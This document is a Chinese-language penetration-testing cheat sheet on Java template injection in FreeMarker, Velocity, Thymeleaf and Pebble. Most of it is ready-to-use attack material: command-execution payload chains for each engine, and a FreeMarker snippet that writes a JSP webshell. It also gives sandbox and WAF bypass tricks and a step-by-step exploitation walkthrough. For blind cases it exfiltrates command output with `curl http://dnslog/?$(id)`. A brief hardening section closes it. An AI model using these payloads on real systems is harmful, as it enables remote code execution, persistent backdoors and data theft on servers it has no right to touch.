# Java 模板注入（Freemarker / Velocity / Thymeleaf / Pebble）

## 一句话理解
Java 模板注入（SSTI），指用户输入进入 FreeMarker / Velocity / Thymeleaf / Pebble 等模板引擎的渲染上下文，被当作模板语法解析执行，攻击者可借此读取数据模型、读写文件、加载任意类，最终实现命令执行。

## 常见成因
- 把用户输入直接作为模板源码传入 `Template` / `evaluate()` / `process()` 等渲染接口
- Controller 返回值（视图名）中拼接用户输入，交给 Thymeleaf 视图解析器
- 后台"自定义模板/邮件模板/短信模板/报表模板"功能缺少权限边界
- 模板缓存文件、模板路径（`_template`、`templateName` 参数）可被用户控制
- 开发误以为"HTML 转义"能防住模板注入（转义只防 XSS，防不了模板层解析）

## 常见危害
- 读取模板上下文数据模型（用户信息、配置、密钥）
- 读取服务器任意文件（classpath 与文件系统）
- 反射加载任意类、实例化对象
- 命令执行（Runtime / ProcessBuilder），进而反弹 Shell、写 Webshell
- 作为打穿 Java 应用内部对象图的入口，常与反序列化、SpEL/OGNL 打通

## 通用探针与引擎识别
### 1. 通用探针

```text
${7*7}              # FreeMarker / Thymeleaf(Spring) 场景
#set($x=7*7)${x}    # Velocity 场景
{{7*7}}             # Pebble 场景
__${7*7}__.x        # Thymeleaf 预处理表达式场景
<%= 7*7 %>          # JSP 动态编译场景（Java 模板引擎中通常原样输出，用于排除）
```

### 2. 各引擎回显特征表

| 探针 | FreeMarker | Velocity | Thymeleaf(Spring) | Pebble | 备注 |
|---|---|---|---|---|---|
| `${7*7}` | 49 | 原样 | 49（进入 `th:*` 属性或预处理时） | 原样 | FM 最快确认 |
| `#set($x=7*7)${x}` | 原样 | 49 | 原样 | 原样 | Velocity 确认 |
| `{{7*7}}` | 原样 | 原样 | 原样 | 49 | Pebble 确认 |
| `__${7*7}__.x` | 原样 | 原样 | 49（视图名/表达式注入时） | 原样 | Thymeleaf 确认 |
| `<%= 7*7 %>` | 原样 | 原样 | 原样 | 原样 | 回显 49 说明是 JSP 编译，非模板引擎 |

> 注意：Thymeleaf 的 `${}` 只有出现在 `th:*` 属性、fragment 表达式或 `__...__` 预处理中才会求值，直接写在静态 HTML 里不会解析。

### 3. FreeMarker `${}` 与 SpEL 的区别（一句话）
FreeMarker 的 `${}` 是模板层表达式，默认只能访问数据模型变量和内建函数（`?api` 等需显式开启），不能直接写 `T(java.lang.Runtime)`；而 Thymeleaf + Spring 环境的 `${}` 底层走 SpEL，可直接用 `T()` 调静态方法 —— SpEL 语法与利用详见 [../exp/EXP-SPEL-Injection.md](EXP-SPEL-Injection.md)。

## Freemarker
### 1. 探针

```text
${7*7}    # 回显 49 即确认
```

### 2. RCE 经典链（按版本/配置）

```ftl
<#-- 链1：Execute 工具类，最经典。适用：未配置 ClassResolver 限制的老版本/默认环境 -->
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

<#-- 链2：ObjectConstructor 实例化 ProcessBuilder。适用条件同上，无回显，适合写文件/反弹 -->
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()> ${ob("java.lang.ProcessBuilder",["id"]).start()}

<#-- 链3：Jython 集成（仅当 classpath 存在 Jython 时可用） -->
<#assign value="freemarker.template.utility.JythonRuntime"?new()> <@value>import os;os.system("id")</@value>

<#-- 提醒：#set 是 Velocity 语法，FreeMarker 中赋值用 <#assign>，FTL 语法勿混用 -->
```

关键版本节点：
- `setNewBuiltinClassResolver()` 自 2.3.17 引入，默认 `UNRESTRICTED_RESOLVER`，很多框架会主动设为 `SAFER_RESOLVER`
- `api_builtin_enabled` 自 2.3.26 引入，默认 `false`（即 `?api` 默认不可用）

```ftl
<#-- 链4：ObjectConstructor 写 Webshell（exec 无回显场景的落地方式，路径按目标中间件调整） -->
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign fos=ob("java.io.FileOutputStream","/var/www/html/shell.jsp")>
${fos.write(("<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>")?api.getBytes())}
${fos.close()}
```

### 3. 内建函数读文件（?api 链）

```ftl
<#-- 前提：服务端设置 api_builtin_enabled=true（2.3.26+ 默认关闭） -->
<#-- object 是数据模型中已存在的任意对象，?api 打开其 Java API 访问 -->
<#assign is=object?api.class.getResourceAsStream("/etc/passwd")>

<#-- 配合 ObjectConstructor 构造 Scanner 把流读成字符串回显 -->
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign sc=ob("java.util.Scanner",is)>
${sc.useDelimiter("\\A").next()}
```

### 4. 老版本 include 读文件

```ftl
<#-- 老版本/未限制时，直接把系统文件当模板包含；纯文本文件会原样输出 -->
<#include "/etc/passwd">
<#-- 局限：文件内容若含 FTL 语法字符（${、<# 等）会被当模板解析而报错，仅适合读纯文本 -->
```

### 5. 高版本沙箱与绕过
当服务端配置了 `TemplateClassResolver.SAFER_RESOLVER`，`?new` 实例化 `Execute` / `ObjectConstructor` / `JythonRuntime` 三个黑名单类会被直接拒绝（报 `Instantiating xxx is not allowed in the template for security reasons`）。绕过一句话：该解析器是黑名单机制、只拦这三个类，可转向数据模型中已暴露对象走 `?api.class` 反射链（需 `api_builtin_enabled=true`）、`<#include>` 指向用户可控内容、或寻找模板上下文中已实例化且未受限的对象继续利用。

### 6. 案例：漏洞代码 + 利用全过程

```java
// 漏洞代码：把用户输入直接当作 FTL 模板源码渲染
@PostMapping("/render")
public String render(@RequestParam("tpl") String tpl, Model model) {
    model.addAttribute("user", "admin");           // 数据模型（模板内可用 object/user）
    try {
        Template t = new Template("userTpl",        // 模板名
                new StringReader(tpl),              // 用户输入直接作为模板源码 → SSTI 根因
                configuration);
        StringWriter sw = new StringWriter();
        t.process(model, sw);                       // 渲染触发点
        return sw.toString();
    } catch (Exception e) {
        return e.getMessage();                      // 报错回显，方便判断限制策略
    }
}
```

利用全过程：
1. 提交 `tpl=${7*7}`，返回 `49`，确认模板解析
2. 提交 `#set($x=1)`，原样输出 → 排除 Velocity，锁定 FreeMarker 语法
3. 提交链1 `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`，回显命令结果，RCE 完成
4. 若第 3 步报错提示不允许实例化 Execute → 说明配置了 `SAFER_RESOLVER`，转第 5 节思路：先试 `?api` 读文件，再找数据模型可用对象做反射
5. 拿到 RCE 后按需读配置文件、写 Webshell、出网反弹

## Velocity
### 1. 探针

```velocity
#set($x=7*7)${x}    ## 回显 49 即确认
```

### 2. RCE 链

```velocity
## 链1：经典纯反射链，不依赖 VelocityTools，1.x/2.x 通用（受 SecureUberspector 等配置影响）
#set($e="exp")
#set($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
#set($inputStream=$a.getInputStream())
#set($scanner=$e.getClass().forName("java.util.Scanner").getConstructor($e.getClass().forName("java.io.InputStream")).newInstance($inputStream).useDelimiter("\\A"))
#if($scanner.hasNext())$scanner.next()#end
```

```velocity
## 链2：Velocity 2.x + VelocityTools 场景，$class 即内置 ClassTool
$class.inspect("java.lang.Runtime").getRuntime().exec("id")
## 注意：exec 返回 Process 对象不直接回显，回显需仿照链1 读流，或用 waitFor() 配合出网验证
```

```velocity
## 链3：ProcessBuilder 变体（getRuntime 被 WAF/沙箱盯上时替换用）
#set($e="exp")
#set($pb=$e.getClass().forName("java.lang.ProcessBuilder").getConstructor($e.getClass().forName("[Ljava.lang.String;")).newInstance(["id"]))
$pb.start()
```

### 3. 变量注入到模板场景（无 SSTI 的判断）

```java
// 安全写法：用户输入只作为变量传入数据模型，模板源码固定
VelocityContext ctx = new VelocityContext();
ctx.put("name", userInput);   // 只进上下文变量
template.merge(ctx, writer);  // 模板源码本身不含用户输入 → 模板层不会解析它
```

判断方法：注入 `#set($x=7*7)${x}` 或 `${7*7}`，若**原样输出**则说明输入没有进入模板解析层，只是普通变量渲染（此时风险至多是 XSS / 二次注入），不存在 SSTI；反之回显 `49` 才是模板注入。

## Thymeleaf
### 1. 预处理表达式 `__${...}__`
Thymeleaf 渲染前有"预处理"阶段：先执行 `__...__` 包裹的表达式，把结果拼回属性表达式再解析。若用户输入能进入属性表达式或视图名，即可借此注入。

```text
__${7*7}__                                # 探针：回显 49
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x    # fragment 表达式注入完整形态
*{7*7}                                    # 选择表达式变体（对象上下文中可用）
${#strings.concat("a","b")}               # 探测处理工具是否可达（Spring 环境）
```

排查时注意求值入口不止一处：`th:text`、`th:href`、`th:with`、`th:fragment`、内联文本 `[[${...}]]` 都会触发表达式解析。

### 2. URL 路径注入（视图名拼接）

```java
// 漏洞代码：用户输入拼进 Controller 返回的视图名
@GetMapping("/path")
public String path(@RequestParam String lang) {
    return "user/" + lang + "/welcome";   // 视图名含用户输入 → 视图名注入
}
```

```text
GET /path?lang=whateverdisplayed__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

原理：视图名被解析为 `user/whateverdisplayed__${...}__.x/welcome`，Thymeleaf 在解析 fragment 表达式（`::` 之后）时触发 `__${...}__` 预处理，表达式被执行。

### 3. 关于 `return "redirect:" + userInput` 场景

```java
// 注意：redirect: 前缀走 Spring 的 RedirectView，不进入 Thymeleaf 模板渲染
// 这类代码通常无 SSTI，主要风险是开放重定向（见 ../exp/EXP-Logic.md）
return "redirect:" + userInput;

// 真正危险的是不带前缀、用户完全可控的视图名：
@GetMapping("/page")
public String page(@RequestParam String name) {
    return name;                          // 返回值直接作为视图名 → 视图名注入
}
// 利用：GET /page?name=__${7*7}__.x → 回显 49 后替换为 exec 执行命令
```

### 4. Thymeleaf + Spring 组合（${} 走 SpEL）
Spring 环境下 `th:text="${...}"` 等表达式由 SpringStandardDialect 交给 **SpEL** 求值，可直接使用 `T(java.lang.Runtime).getRuntime().exec('id')`、`@beanName.method()` 等语法；纯 Thymeleaf（非 Spring）表达式底层走 **OGNL**。两者语法细节分别见 [../exp/EXP-SPEL-Injection.md](EXP-SPEL-Injection.md) 与 [../exp/EXP-OGNL-Injection.md](EXP-OGNL-Injection.md)。

### 5. 案例：邮件模板回显利用
- 场景：后台"邮件模板预览"功能把用户输入写入 `th:text` 属性再渲染
- 步骤：先填 `__${7*7}__` 确认预处理生效 → 换 `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x` → 无回显时改用出网命令（curl/wget 请求 DNSLog）验证
- 版本相关：Thymeleaf 3.1.2 修复了表达式注入（CVE-2023-38286），3.0.12 修复了 CVE-2021-42550（同为表达式注入）

## Pebble（简要）
```jinja
{# 探针 #}
{{ 7*7 }}    {# 回显 49 即确认 #}

{# 实际可用 RCE 变体：利用 (1).TYPE 拿到 Class 入口后反射调用 #}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd).getInputStream().readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').getConstructors()[0].newInstance(bytes).toString() }}

{# 版本限制：较新版本 Pebble 默认对反射入口（getClass / forName 等）加了黑名单， #}
{# "".execute 之类 payload 并不通用，实战需结合具体版本逐一验证可用入口 #}
```

## 实战排查思路
### 1. 代码审计关键词

```text
# FreeMarker
new Template(          getTemplate(          .process(
StringTemplateResolver setNewBuiltinClassResolver  api_builtin_enabled

# Velocity
VelocityEngine         .evaluate(            .merge(
VelocityContext        StringWriter(          # templatePath / 模板名参数可控

# Thymeleaf
SpringTemplateEngine   templateEngine.process(
return "xxx" + param   setViewName(           Controller 返回值拼接（重点看无前缀视图名）

# 通用
TemplateEngine  render(  ServletUtils  以及一切"把请求参数写进模板字符串"的调用
```

### 2. 黑盒判断

```text
# 三类探针分开测，命中哪个就是哪个引擎
${7*7}               → FreeMarker / Thymeleaf(Spring)
#set($x=7*7)${x}     → Velocity
__${7*7}__.x         → Thymeleaf（URL 路径、表单、header 里都试一遍）
{{7*7}}              → Pebble

# 都原样输出 → 输入未进模板解析层，回头检查是否有二次拼接/模板文件写入场景
```

### 3. 自动化辅助

```text
# SSTImap / tplmap 支持多引擎自动识别与利用（Java 引擎覆盖有限，结果需手工复核）
python3 sstimap.py -u "https://target/render?tpl=${7*7}"
python3 tplmap.py -u "https://target/render?tpl=*"
# Java 场景建议手工按引擎逐条验证 payload，结合报错信息判断引擎与限制配置
```

### 4. 高危业务场景
- 后台自定义模板、主题编辑、邮件/短信模板预览
- 报表导出、PDF 渲染、页面静态化
- 模板名/模板路径参数可控（如 Confluence `_template` 参数，CVE-2019-3396 实战环境见 Vulhub）
- 报错信息会带出引擎名与版本（`freemarker.core.ParseException`、`org.thymeleaf.exceptions.TemplateProcessingException` 等），优先利用

## 常见绕过思路
- FreeMarker `SAFER_RESOLVER` 拦 `?new`：黑名单仅三个类，转 `?api.class` 反射链（需 `api_builtin_enabled=true`）、`<#include>` 可控文件、或寻找数据模型中已存在的对象继续打通
- Velocity 反射被 SecureUberspector 限制：换 `ProcessBuilder` 构造链、用变量拼接种类名躲字符串检测（如 `#set($c="java.la")#set($rt="${c}ng.Runtime")`）
- Thymeleaf 表达式被过滤：对 payload URL 编码、尝试 `*{...}` 选择表达式、`~{...}` fragment 表达式、`th:with` 属性等其它求值入口
- WAF 拦 `exec`/`Runtime` 关键词：改用 `ProcessBuilder(...).start()`、反射写字节码、直接写文件落地 Webshell（结合 [../exp/EXP-Upload-JSP.md](EXP-Upload-JSP.md)）
- 无回显：命令换 `curl http://dnslog/?$(id)`、写文件到 Web 目录再访问

## 防御要点
### 1. 用户输入只做数据，不做模板
输入只能通过 `context.put()` / `model.addAttribute()` 作为变量传入，模板源码、模板名、视图名一律不拼接用户输入。

### 2. FreeMarker 加固
- `configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)`（黑名单机制，重要系统可自定义白名单 Resolver）
- 保持 `api_builtin_enabled=false`（2.3.26+ 默认）
- 限制 `TemplateLoader` 可访问目录，禁用 `<#include>` 指向模板目录外

### 3. Velocity / Thymeleaf 加固
- Velocity：禁止对用户输入调用 `evaluate()`；启用 `SecureUberspector` 限制反射
- Thymeleaf：Controller 不返回用户可控视图名；升级至 3.1.2+（修复 CVE-2023-38286）

### 4. 权限与审计
模板编辑能力只赋给极少数可信角色，保留变更审计；模板渲染服务尽量与业务容器隔离（独立进程/低权限运行）。

## 速查清单
- 三探针定位引擎：`${7*7}` / `#set($x=7*7)${x}` / `__${7*7}__.x`，别忘 `{{7*7}}` 测 Pebble
- FreeMarker 路径：`?new Execute` → `ObjectConstructor` → `?api.class` 反射 → `<#include` 读文件
- Velocity 路径：`#set` 反射链（Runtime/Scanner 回显）→ `$class.inspect`（2.x+Tools）
- Thymeleaf 路径：`__${...}__` 预处理 → 视图名注入（`::` 触发）→ Spring 下 `${}` 走 SpEL
- Pebble：`(1).TYPE.forName` 反射，注意版本黑名单
- 变量原样回显 ≠ SSTI，先确认输入是否真的进入模板解析层
- 排查重点：后台模板编辑、邮件/短信模板、报表导出、模板名参数可控

## Reference
- https://github.com/payloadbox/ssti-payloads
- https://freemarker.apache.org/docs/app_faq.html#faq_template_exploit （FreeMarker 官方 FAQ：模板可利用面与 ClassResolver 说明）
- https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396 （Confluence `_template` 参数 Velocity SSTI 实战环境）
- https://nvd.nist.gov/vuln/detail/CVE-2023-38286 （Thymeleaf 表达式注入，修复于 3.1.2）
- https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/ （Thymeleaf 视图名注入/预处理利用研究）
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Serverside%20Template%20Injection/README.md
- 本仓库交叉引用：[../exp/EXP-SPEL-Injection.md](EXP-SPEL-Injection.md)、[../exp/EXP-OGNL-Injection.md](EXP-OGNL-Injection.md)、[../exp/EXP-SSTI-ALL.md](EXP-SSTI-ALL.md)、[../exp/EXP-SSTI-PHP.md](EXP-SSTI-PHP.md)
